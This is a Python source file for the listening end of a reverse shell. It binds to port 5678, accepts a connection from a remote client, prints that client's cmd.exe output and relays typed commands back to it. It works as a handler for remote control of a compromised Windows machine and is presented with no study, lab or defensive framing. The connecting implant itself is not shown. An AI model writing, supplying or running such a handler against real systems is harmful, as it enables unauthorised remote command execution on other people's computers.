import socket
from simple_term_menu import TerminalMenu
import subprocess
import threading
import time
import os
from colorama import Fore, Style


host = "0.0.0.0"
port = 5678

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(Fore.YELLOW + f"[+] Listening on port {port}" + Style.RESET_ALL)


# receive cmd.exe output from the client
def shellreceiver(conn):
    while True:
        try:
            data = conn.recv(6042)
            if not data:
                raise ConnectionError
            print(data.decode(errors="ignore"), end="", flush=True)
        except:
            print(Fore.RED + "\n[!] Connection lost. Exiting..." + Style.RESET_ALL)
            conn.close()
            os._exit(0)

# send commands to the client
def shellsender(conn):
    while True:
        try:
            mycmd = input("")
            conn.send((mycmd + "\n").encode())
        except:
            print(Fore.RED + "\n[!] Connection lost. Exiting..." + Style.RESET_ALL)
            conn.close()
            os._exit(0)
              


conn, addr = s.accept()
print(f"this is a conn:\n{conn}")
print(f"This is the addr:\n{addr}")
print(Fore.GREEN + f"[*] Accepted new connection from: {addr[0]}:{addr[1]}" + Style.RESET_ALL)


# start threads
shell_rev= threading.Thread(target=shellreceiver, args=(conn,), daemon=True)
shell_rev.start()

shell_snd = threading.Thread(target=shellsender, args=(conn,), daemon=True )
shell_snd.start()
# keep main thread alive
while True:
    time.sleep(1)
